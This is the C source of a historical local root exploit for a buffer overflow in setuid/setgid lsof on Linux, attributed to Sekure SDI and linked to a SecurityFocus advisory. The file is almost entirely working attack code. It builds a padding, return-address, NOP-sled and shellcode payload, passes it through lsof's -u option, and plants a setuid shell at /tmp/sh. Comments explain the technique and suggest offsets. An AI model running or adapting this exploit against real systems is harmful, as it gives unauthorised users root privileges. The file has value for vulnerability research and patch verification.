// source: https://www.securityfocus.com/bid/496/info
//
// Lsof is an open file management utility included with many linux distributions. When run setuid root or setgid kmem, it is subject to a buffer overflow that can lead to regular users gaining root priveleges.
//

/*
 * Sekure SDI (Brazilian Information Security Team)
 * lsof local exploit for linux
 * by c0nd0r <condor@sekure.org>
 *
 * Security problem found by HERT. (www.hert.org)
 *
 * -> This little tool will bring you a suid or sgid shell owned by lsof
 *    user (root|kmem usually) at /tmp directory (/tmp/sh).
 *
 * -----------------------------------------------------------------------
 * Code explanation: We've used a unsual technique here.
 * The buffer allocated was too small for the standard expl, so we did a
 * little trick, by overflowing with 'A' till reaching the ret address and
 * then we've filled with NOP and the shellcode just after the modified
 * ret address. So we have a different exploit architeture:
 * [garbage][eip modified][lotsa NOP's][shellcode]
 * That's why we need a bigger offset.
 * -----------------------------------------------------------------------
 *
 * usage ( needa have a little brain):
 *  ./SDI-lsof <offset> (between 373-505)
 *
 * 4 phun - http://www.sekure.org
 * Thanks to jamez, dumped, bishop, bahamas, slide, falcon, vader
 * and guys at #uground (irc.brasnet.org network)
 *
 */


/* change the lsof path if it's needed */
#define PATH "/usr/bin/lsof"


char shellcode[] =
        "\xeb\x31\x5e\x89\x76\x32\x8d\x5e\x08\x89\x5e\x36"
        "\x8d\x5e\x0b\x89\x5e\x3a\x31\xc0\x88\x46\x07\x88"
        "\x46\x0a\x88\x46\x31\x89\x46\x3e\xb0\x0b\x89\xf3"
        "\x8d\x4e\x32\x8d\x56\x3e\xcd\x80\x31\xdb\x89\xd8"
        "\x40\xcd\x80\xe8\xca\xff\xff\xff/bin/sh -c cp /bin/sh /tmp/sh; chmod 6755 /tmp/sh";


unsigned long getsp ( void) {
  __asm__("mov %esp,%eax");
}

main ( int argc, char *argv[0]) {
  char b00m[220];
  long addr;
  int x, y, offset=380;

  if (argc > 1) offset = atoi(argv[1]);

  for (x = 0; x < 16; x++)
    b00m[x] = 'A';

  addr = getsp() + offset;
  printf ( "SDI-lsof exploiting at 0x%x\n", addr);

  b00m[x++] = addr & 0x000000ff;
  b00m[x++] = (addr & 0x0000ff00) >> 8;
  b00m[x++] = (addr & 0x00ff0000) >> 16;
  b00m[x++] = (addr & 0xff000000) >> 24;

  for ( ; x < 100; x++)
    b00m[x] = 0x90;

  for (y = 0; y < strlen(shellcode); y++, x++)
    b00m[x] = shellcode[y];

  b00m[strlen(b00m)] = '\0';

  printf ( "\nFind a suid shell at /tmp/sh...\n\n");
  execl ( PATH, PATH, "-u", b00m, (char *)0);
  perror ( "execl") ;

}